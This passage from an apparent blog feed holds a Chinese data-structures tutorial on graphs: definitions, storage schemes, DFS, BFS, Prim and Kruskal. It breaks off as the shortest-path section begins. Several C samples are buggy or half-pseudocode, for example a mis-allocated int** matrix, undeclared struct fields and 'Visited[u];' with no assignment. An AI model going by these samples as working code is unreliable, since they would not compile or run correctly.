    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="优先队列" scheme="http://example.com/tags/%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/"/>
    
    <category term="堆" scheme="http://example.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（六）——走近图论</title>
    <link href="http://example.com/2023/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E5%85%AD%EF%BC%89%E2%80%94%E2%80%94%E8%B5%B0%E8%BF%91%E5%9B%BE%E8%AE%BA/"/>
    <id>http://example.com/2023/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E5%85%AD%EF%BC%89%E2%80%94%E2%80%94%E8%B5%B0%E8%BF%91%E5%9B%BE%E8%AE%BA/</id>
    <published>2023-11-22T07:31:22.000Z</published>
    <updated>2023-12-06T05:16:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>让我们从一个题目开始图的学习。</p><h3 id="哥尼斯堡桥问题"><a href="#哥尼斯堡桥问题" class="headerlink" title="哥尼斯堡桥问题"></a>哥尼斯堡桥问题</h3><blockquote><p>18世纪初普鲁士的哥尼斯堡，有一条河穿过，河上有两个小岛，有七座桥把两个岛与河岸联系起来（如概述图）。有个人提出一个问题：一个步行者怎样才能不重复、不遗漏地一次走完七座桥，最后回到出发点。</p></blockquote><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20231130163839.png" alt="20231130163839"></p><p>大数学家<a href="https://baike.baidu.com/item/%E6%AC%A7%E6%8B%89?fromModule=lemma_inlink">欧拉</a>把它转化成一个几何问题——<a href="https://baike.baidu.com/item/%E4%B8%80%E7%AC%94%E7%94%BB%E9%97%AE%E9%A2%98?fromModule=lemma_inlink">一笔画问题</a>。他用顶点来表示各个陆地区域，用边表示桥，并以此建模画出了一个<strong>图</strong>。他不仅解决了此问题，且给出了连通图可以一笔画的充要条件是：奇点的数目不是0个就是2个（连到一点的数目如果是奇数条，就称为奇点；如果是偶数条，就称为偶点。要想一笔画成，必须中间点均是偶点，也就是有来路必有另一条去路，奇点只可能在两端。因此任何图能一笔画成，奇点要么没有，要么在两端）</p><p>由此，图论和几何拓扑正式诞生了。</p><h2 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h2><p>一个图由非空的顶点集合V和一个描述顶点之间关系（边或弧）的集合VR组成。</p><p>如G＝(V,VR)，V&#x3D;(v1,v2,v3,v4,v5)，VR&#x3D;((v1,v2),(v3,v4),(v5,v1))。</p><p>图又分为<strong>有向图</strong>和<strong>无向图</strong>，简单的来说就是边是否有向。是只能由一个顶点单向到达另一个顶点，还是两边都可以到达对方。一般用箭头和直线来加以区分，在VR中则分别用括号（有向）和尖括号&lt;无向&gt;来加以区分。<strong>完全有向图</strong>和<strong>完全无向图</strong>指的是任意一点都有一条路径到达图上其他任意一点的图。</p><p>顶点又有<strong>度</strong>，<strong>入度</strong>，和<strong>出度</strong>的概念。与一个顶点相关联的边的数目叫做度，，以该起点为终点的边到的数目叫做入度，以该顶点为起点的边的数目叫做出度。</p><p><strong>路径</strong>与<strong>路径长度</strong>的定义和树相同。若一条路径的起点和终点都是同一个点，就称为<strong>回路</strong>。如果路径中的顶点不重复出现，就叫做<strong>简单路径</strong>。如果除了起点和终点相同外其余顶点不重复，就是<strong>简单回路</strong>。</p><p>如果一个图的顶点和对应关系都是另一个图对应的子集，那么这个图就是另一个图的<strong>子图</strong>。</p><p>若图中有一条路径是独立的，无法通过另一部分路径到达，就说它不<strong>连通</strong>，否则就是<strong>连通图</strong>。无向图的极大连通子图称为的<strong>连通分量</strong>( Connected Component)。任何连通图的连通分量只有一个，即是其自身，非连通的无向图有多个连通分量</p><p><strong>生成树</strong>是指连通图G包含全部n个顶点的一个极小连通子图。对于该生成树任意加上一条原图的边则必然出现回路，任意减少一条边则必定非连通。</p><h2 id="图的储存方式"><a href="#图的储存方式" class="headerlink" title="图的储存方式"></a>图的储存方式</h2><p>图的储存方式有几种。这里将重点介绍邻接矩阵，邻接表两种方法。十字链表法和邻接多重表则只作为拓展了解即可。</p><p>在开始之前我们先强调一点。任何数据结构的意义都在于“快”，也就是将其运用于实际生产中追求计算机处理效率最大化。而我们程序员所需要的处理操作无非也就四种：<em><strong>增、删、查、改</strong></em>。我们讨论的任何优缺点都是基于这四种操作之上的情况的。</p><p>那么话不多说正式开始吧。</p><h3 id="领接矩阵"><a href="#领接矩阵" class="headerlink" title="领接矩阵"></a>领接矩阵</h3><p>现在假设有顶点i与j，我们定义一个矩阵A来储存图。当两个顶点i、j是连通的，就定义A[i][j]&#x3D;1；否则定义此处为0。如果是无向图，那么也有A[j][i]&#x3D;1。一般为了节省储存空间，我们只操作一半的矩阵就好。如果是带权图，就把1修改为权重w<del>ij</del>。</p><p>我们定义邻接矩阵的结构如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> V;<span class="comment">//顶点 Vertices</span></span><br><span class="line">    <span class="type">int</span> E;<span class="comment">//边 Edges</span></span><br><span class="line">    <span class="type">int</span> **Adj;<span class="comment">//表示二维矩阵</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再考虑一下实现方式，为了方便起见，我们可以先读入顶点的名称，然后再读取顶点对的名字（也就是边）。下面是实现的代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Graph*<span class="title function_">adjMatrixOfGraph</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//读取无向图的领接矩阵</span></span><br><span class="line">    <span class="type">int</span> i,u,v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>*<span class="title">G</span>=</span> (<span class="keyword">struct</span> Graph*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> Graph));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!G)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;Number of Vertices:%d, Number of Edges:%d&quot;</span>,&amp;G-&gt;V,&amp;G-&gt;E);<span class="comment">//输入顶点数和边数</span></span><br><span class="line">    G-&gt;Adj= <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="type">int</span>)*G-&gt;V*G-&gt;V);<span class="comment">//创建矩阵</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (u = <span class="number">0</span>; u &lt; G-&gt;V; ++u) &#123;</span><br><span class="line">        <span class="keyword">for</span> (v = <span class="number">0</span>; v &lt; G-&gt;V; ++v) &#123;</span><br><span class="line">            G-&gt;Adj[u][v]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//初始化矩阵</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;Reading Edges:%d %d&quot;</span>,&amp;u,&amp;v);</span><br><span class="line">        G-&gt;Adj[u][v]=<span class="number">1</span>;</span><br><span class="line">        G-&gt;Adj[v][u]=<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="comment">//读取边的信息</span></span><br><span class="line">    <span class="keyword">return</span> G;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>领接矩阵的优点是在判断顶点间的关系时可以实现随机读取，时间复杂度为O(1)。但缺点是如果要确定边和点的数目，就必须要遍历完整个矩阵。除此之外，还有储存空间开销大，删除顶点、边不方便等问题。</p><h3 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h3><p>邻接表是一个链式储存结构。在邻接表中，每一个顶点都建立一个链表，第i个单链表中的节点表示依附于顶点v<del>i</del>的所有边。</p><p>我们给出邻接表的定义。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> vertexNumber;<span class="comment">//储存节点的名字</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">next</span>;</span><span class="comment">//指向它连接的顶点表示边</span></span><br><span class="line">    <span class="comment">//OtherInfo info;  //和边相关的信息，权重啥的</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> V;<span class="comment">//顶点的数目，用于创建单链表计数</span></span><br><span class="line">    <span class="type">int</span> E;<span class="comment">//边的数目，用于读入数据计数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">Adj</span>;</span><span class="comment">//指向链表的头指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>基本上就是给定了一个图，包含顶点和边的数量以及依据这两个数据指向的一个邻接表，表的节点则储存顶点本身的信息以及指向它所连接的另一个顶点（也是一个节点结构）。邻接表中单链表的最后一个节点总是指向该顶点的邻接表本身。如果该顶点仅有头节点，也就是不与任何其他顶点连接，那么此时该节点的指针指向自己。</p><p>下面给出生成邻接表具体的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Graph* <span class="title function_">adjListOfGraph</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, x, y;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>* <span class="title">G</span> =</span> (<span class="keyword">struct</span> Graph*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Graph));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!G) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of Vertices:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;G-&gt;V);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of Edges:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;G-&gt;E);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    G-&gt;Adj = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode) * G-&gt;V);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        <span class="comment">//初始化邻接表</span></span><br><span class="line">        <span class="comment">//G-&gt;Adj[i]= (struct ListNode*)malloc(sizeof (struct ListNode));</span></span><br><span class="line">        G-&gt;Adj[i].vertexNumber = i;</span><br><span class="line">        G-&gt;Adj[i].next = &amp;(G-&gt;Adj[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d个顶点的名称为：\n&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,G-&gt;Adj[i].name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reading Edges:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reading Weight:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;weight);</span><br><span class="line">        <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        temp = (<span class="keyword">struct</span> ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        temp-&gt;vertexNumber = y;</span><br><span class="line">        temp-&gt;next = (G-&gt;Adj[x].next);<span class="comment">//临时节点指向第x条单链表，也就是第x个顶点，且采用头插法</span></span><br><span class="line">        temp-&gt;dis = weight;<span class="comment">//写入权重</span></span><br><span class="line">        G-&gt;Adj[x].next = temp;<span class="comment">//指向临时节点</span></span><br><span class="line"></span><br><span class="line">        temp = (<span class="keyword">struct</span> ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        temp-&gt;vertexNumber = x;</span><br><span class="line">        temp-&gt;next = (G-&gt;Adj[y].next);</span><br><span class="line">        temp-&gt;dis = weight;</span><br><span class="line">        G-&gt;Adj[y].next = temp;</span><br><span class="line">        <span class="comment">//最后的效果就是x单链表指向y，y单链表指向x</span></span><br><span class="line">        <span class="comment">//也就是说，这是个无向图，如果有向，把第二部分去掉就好</span></span><br><span class="line">        <span class="comment">//本题要求有向，故删去第二部分</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> G;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后实现的效果如图所示。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/v2-09bd69e515de6332571f48cfd2b27cac_b.jpg" alt="img"></p><p>虽然储存空间相对邻接矩阵已经小了很多，计算图的度也十分方便，即便如此邻接表也是有缺陷的。比如我们要实现删除一个节点的功能，虽然直接删除掉该节点对应的单链表很简单，但是还需要修改其他顶点的链表删除和指定节点的连接。这种操作带来的麻烦与风险性不言而喻。</p><h3 id="十字链表"><a href="#十字链表" class="headerlink" title="十字链表"></a>十字链表</h3><blockquote><p>回忆邻接矩阵与邻接表的存储结构，它们都不便于求顶点的出度与入度（对于每个顶点而言，欲求其出入度，邻接矩阵需要扫描2*n次，而邻接表只易在求解其出度，欲求入度还需重新扫面整张图）。为了解决上述两者求出入度的局限性，在此引入十字链表，它可以看成邻接表与逆邻接表的结合，方便求解顶点出入度与获取顶点的出入度边。</p></blockquote><p>十字链表和邻接表还是有点区别的，实际上是邻接表和逆邻接表的结合。</p><p>十字链表的存储结构包含表头结点表与弧表，与邻接表类似，是一种顺序结合链式的存储结构，因此需要有两个指针域分别指向以顶点为弧尾和以顶点为弧头的弧结点。</p><p>表头结点表是一个顺序存储结构的数组，其结点数据类型如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/d6811dc195984c0f82387ea8e8391967.png" alt="img"></p><p>它的顶点节点拥有一个data域储存和顶点相关的信息以及两条链域，分别指向以该顶点为弧头或弧尾的第一个弧节点。</p><p>弧结点的数据类型如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/51d7ffbdcc6d467485967deb78ba438d.png" alt="img"></p><p>弧尾结点存储该弧尾结点所在图中的位置，弧头结点同理；弧上信息指示权值等弧数据；hlink指向与该弧有相同弧头的弧结点，tlink指向与该弧有相同弧尾的弧结点</p><p>结合这些给出十字链表的示意图：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/4f87bee55ba5485f8d9d892bbe4528f7.png" alt="img"></p><p>更多资料可以参考：<a href="https://blog.csdn.net/QQ657205470/article/details/127361701?ops_request_misc=&request_id=&biz_id=102&utm_term=%E5%8D%81%E5%AD%97%E9%93%BE%E8%A1%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-127361701.nonecase&spm=1018.2226.3001.4187">图的存储结构-十字链表_老攀呀的博客-CSDN博客</a>。</p><h3 id="邻接多重表"><a href="#邻接多重表" class="headerlink" title="邻接多重表"></a>邻接多重表</h3><p>邻接多重表是无向图的一种存储结构。如果在无向图中我们的侧重点在顶点上，那么使用邻接表是很合适的，然而之前我们讨论过，当我们的侧重点在边上，也就是需要对边增删查改的时候，用邻接多重表就更加合适了。</p><p>与十字链表一样，邻接多重表是由顶点集合和边集合构成的。但又与十字链表不同的是，邻接多重表是无向图的存储结构，而十字链表是针对有向图的。因为不考虑边的方向，所以和十字链表相比较，顶点结点只需要一个指针域指向所连接的边结点即可。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/048e5367b8e04499ab0d6d320310b78d.png" alt="img"></p><p>顶点集VexNode由顶点的数据域data和指向<strong>顶点所连接的边节点的指针</strong>firstEdge构成。</p><p>而在边集中对于一条边来说，<strong>iVex</strong>和<strong>jVex</strong>是这一条边的连接的两个节点（Vi，Vj）在顶点集中的下标，headEdge和tailEdge分别是指向有着相同头、尾节点的<strong>边节点的指针</strong>。</p><p>更多资料可以参考：<a href="https://blog.csdn.net/bible_reader/article/details/71250117?ops_request_misc=%7B%22request_id%22:%22170005094416800215025349%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170005094416800215025349&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-71250117-null-null.142%5Ev96%5Epc_search_result_base5&utm_term=%E9%82%BB%E6%8E%A5%E5%A4%9A%E9%87%8D%E8%A1%A8&spm=1018.2226.3001.4187">【数据结构】邻接多重表_数据结构邻接多重表-CSDN博客</a>。</p><h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><p>从图中任意一个顶点出发访问图的其他所有顶点且仅访问一次，这种行为就是图的遍历。</p><p>图的遍历通常有两种算法：</p><ol><li>深度优先搜索</li><li>广度优先搜索</li></ol><p>这两种算法都相当经典，值得深入学习。</p><h3 id="深度优先搜索-Depth-First-Search-DFS"><a href="#深度优先搜索-Depth-First-Search-DFS" class="headerlink" title="深度优先搜索&#x2F;Depth First Search, DFS"></a>深度优先搜索&#x2F;Depth First Search, DFS</h3><p>深度优先搜索（Depth-First Search，DFS）是十分常见的图搜索方法之一。深度优先搜索会沿着一条路径一直搜索下去。首先选取一个顶点作为起点，然后尝试访问连接的其他顶点。如果该节点没有被访问，就选取该节点继续重复上述过程，也就是成为一个新起点。如果该节点已经被访问过，就回退到之前的顶点。如果遇到“死胡同”，也就是在无法搜索时，那么就回退到刚刚访问过的节点，这个过程叫做<em>回溯</em>。当回溯到开始的顶点时，该过程终止。深度优先遍历按照深度优先搜索的方式对图进行遍历。并且每个节点只能访问一次。</p><p>深搜优先搜索的本质上就是持续搜索，遍历了所有可能的情况，必然能得到解。DFS搜索的流程是一个树的形式，每次一条路走到黑。</p><p>一般采用栈结构来辅助DFS的实现，但因为递归时利用的也是栈，所以一般用递归来实现DFS算法。将DFS用于二叉树，等价于使用前中后序遍历。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/af8af348f00409d2a3efc0ec3c7c0c73.gif" alt="img"></p><p>基于此机制的算法实现如下：假设Visited是一个全局数组，用于记录顶点是否已经被访问过。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注：此处算法代码实现存疑，仅供参考</span></span><br><span class="line"><span class="type">int</span> Visited[G-&gt;V];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="keyword">struct</span> Graph*G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="comment">/*如果用邻接矩阵的方法来表示图，那么该节点没有被访问过的条件是：</span></span><br><span class="line"><span class="comment">     if(!Visited[v]&amp;&amp;G-&gt;Adj[u][v])*/</span></span><br><span class="line">    Visited[u];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v = <span class="number">0</span>; v &lt; G-&gt;V; ++v) &#123;</span><br><span class="line">        对u的每个尚未被访问过的邻接节点v<span class="comment">//也就是判断条件，这里未给出</span></span><br><span class="line">        &#123;</span><br><span class="line">            DFS(G,v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraversal</span><span class="params">(<span class="keyword">struct</span> Graph*G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        Visited[i]=<span class="number">0</span>;<span class="comment">//把所有数组全部置零</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果图有不止一个连通分量，那么这个循环就是需要的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!Visited[i])</span><br><span class="line">                DFS(G,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中第二个算法用于处理非连通图的情况。</p><p>需要强调的是，DFS算法并非是一种具体的算法，而是一种算法的思想，即通过设置一个判定条件以“不撞南墙不回头”的方式对图或者树进行搜索的方式。</p><h3 id="广度优先搜索算法-Breadth-First-Search-BFS"><a href="#广度优先搜索算法-Breadth-First-Search-BFS" class="headerlink" title="广度优先搜索算法&#x2F;Breadth First Search, BFS"></a>广度优先搜索算法&#x2F;Breadth First Search, BFS</h3><p>也就是层次遍历，从上往下对每一层依次访问，在每一层中，从左往右（也可以从右往左）访问结点，访问完一层就进入下一层，直到没有结点可以访问为止。</p><p>一般用队列来实现BFS。将BFS用于二叉树，等价于使用层次遍历。或者说，层次遍历本就是借鉴了BFS算法。</p><p>我们令开始的顶点层数为0，BFS算法先访问最开始的顶点，然后访问第一层的所有顶点，即与开始的顶点距离为1的顶点。随后，再访问第二层的所有顶点。以此类推，直到所有的顶点都被访问。通常使用队列来储存每一层的顶点。</p><p>和DFS一样，我们使用一个全局数组来保存所有的顶点并预设为未访问，每个顶点被访问后就设为访问过。</p><p>具体的代码实现如下所示。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(<span class="keyword">struct</span> Graph*G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span> =</span> CreateQueue();</span><br><span class="line">    EnQueue(Q,u);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(!IsEmptyQueue(Q))&#123;</span><br><span class="line">        u=DeQueue(Q);</span><br><span class="line">        Process u;<span class="comment">//操作，例如打印等</span></span><br><span class="line">        Visited[s]=<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*如果用邻接矩阵的方法来表示图，那么该节点没有被访问过的条件是：</span></span><br><span class="line"><span class="comment">     if(!Visited[v]&amp;&amp;G-&gt;Adj[u][v])*/</span></span><br><span class="line">        对u的每个尚未被访问过的邻接节点v<span class="comment">//也就是判断条件，这里未给出</span></span><br><span class="line">        &#123;</span><br><span class="line">            EnQueue(Q,v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraversal</span><span class="params">(<span class="keyword">struct</span> Graph *G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;G-&gt;V;i++)</span><br><span class="line">        Visited[i]=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//如果图有不止一个连通分量，那么这个循环就是需要的</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!Visited[i])</span><br><span class="line">            BFS(G,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和DFS一样，BFS也是一种算法思想，并没有特定的模板。树的层次遍历就是BFS算法思想最好的具现化。</p><h2 id="图的算法问题集"><a href="#图的算法问题集" class="headerlink" title="图的算法问题集"></a>图的算法问题集</h2><h3 id="连通性问题"><a href="#连通性问题" class="headerlink" title="连通性问题"></a>连通性问题</h3><p>连通性问题，也就是找出一个图的生成树&#x2F;极小连通子图。大致思想就是通过DFS或者BFS来遍历子图，然后再从一个未被访问的顶点继续遍历下一个连通分量，与图的遍历做法几乎相同。</p><p>通过图的遍历可以得到图的一棵或者多棵生成树。由深度优先搜索生成的树称为深度优先搜索树，广度优先搜索生成的树称为广度优先搜索树。</p><p>因为一个连通图对应的生成树不唯一，我们把生成树中所有边的权值之和称为<strong>代价</strong>，代价最小的生成树称为<strong>最小生成树</strong>。</p><p>比如我们要在n个城市间修建n-1条路线，如何在最节省经费的条件下建立这个通道？这个问题等价于在e条带权边选取n-1条边（不构成回路）来使权值最小。</p><p>那么如何构造最小生成树呢？我们引入两种算法。</p><h4 id="普里姆-Prim算法"><a href="#普里姆-Prim算法" class="headerlink" title="普里姆&#x2F;Prim算法"></a>普里姆&#x2F;Prim算法</h4><p>我这本参考书上实现Prim算法使用了优先队列，但是我还没有学习相关的数据结构，所以暂时用其他博客文章来代替理解。</p><p>可以参考这篇文章：<a href="https://blog.csdn.net/qq_62213124/article/details/121597780?ops_request_misc=%7B%22request_id%22:%22170063514316800184173992%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170063514316800184173992&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121597780-null-null.142%5Ev96%5Epc_search_result_base5&utm_term=prim%E7%AE%97%E6%B3%95%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91&spm=1018.2226.3001.4187">最小生成树——Prim算法（详细图解）_prim最小生成树_skynesser的博客-CSDN博客</a>。</p><p>有一种实现方法是分别储存所有顶点node、是否被访问selected、权值minDist、父母顶点parent。</p><p>首先将所有顶点的selected栏设为False，所有顶点的minDist为inf，parent为-1。然后初始化第一个顶点selected状态为True，minDist为空，parent仍为-1。</p><p>接下来开始进行遍历操作，分为三步：更新Update、扫描Scan、添加Add。每次访问（这里还没有更新状态）与已有顶点相连接的其他顶点时，都更新顶点的权值以及父母顶点。随后扫描到最小的权值，将该两个顶点连接并将更新selected状态。重复上述步骤直到所有的顶点都被访问，此时selected都为True且minDist均为 - ，最小生成树储存在parent中（对应点和点之间的连接关系）。</p><h4 id="克鲁斯卡尔-Kruskal算法"><a href="#克鲁斯卡尔-Kruskal算法" class="headerlink" title="克鲁斯卡尔&#x2F;Kruskal算法"></a>克鲁斯卡尔&#x2F;Kruskal算法</h4><p>该算法的思想比较简单。首先将连通图的所有边按照权重从小到大排序放入一个列表中，然后依次向图中加入边。每次添加一条边都要进行一次判断：添加边后该图是否形成环？若没有，则边成功添加入图，边数加一；若形成环，则丢弃这条边，边数不变。当边数达到n-1时（假设该图一共有n个顶点），说明找到了最小生成树，算法结束。</p><p>这里也借鉴其他人的博客<a href="https://blog.csdn.net/hzf0701/article/details/107933639?ops_request_misc=%7B%22request_id%22:%22170063754216800225570435%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170063754216800225570435&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107933639-null-null.142%5Ev96%5Epc_search_result_base5&utm_term=">Kruskal算法简易教程（附最全注释代码实现）-CSDN博客</a>。就不详细写出算法实现了（参考书中利用了不相交集和优先队列实现）。</p><p>该算法的关键问题是如何判断图形成了环。</p><h3 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h3><p>最短路径问题一般是给定一个图G&#x3D;(V,E)和一个顶点s，需要求出顶点s到达其余每个顶点的最短路径。采用何种最短路径算法依赖于图的类型。我将最短路径算法和图的类型进行的简单的归纳。</p><table><thead><tr><th>图的类型</th><th>算法</th></tr></thead><tbody><tr><td>无权图的最短路径</td><td>“朴素算法”</td></tr><tr><td>有权图的最短路径</td><td>迪杰斯特拉算法&#x2F;Dijkstra算法</td></tr><tr><td>具有负权重边的最短路径</td><td>贝尔曼福特算法&#x2F;Bellman-Ford算法</td></tr></tbody></table><p>下面我们依次来介绍这些情况。</p><h4 id="“朴素算法”"><a href="#“朴素算法”" class="headerlink" 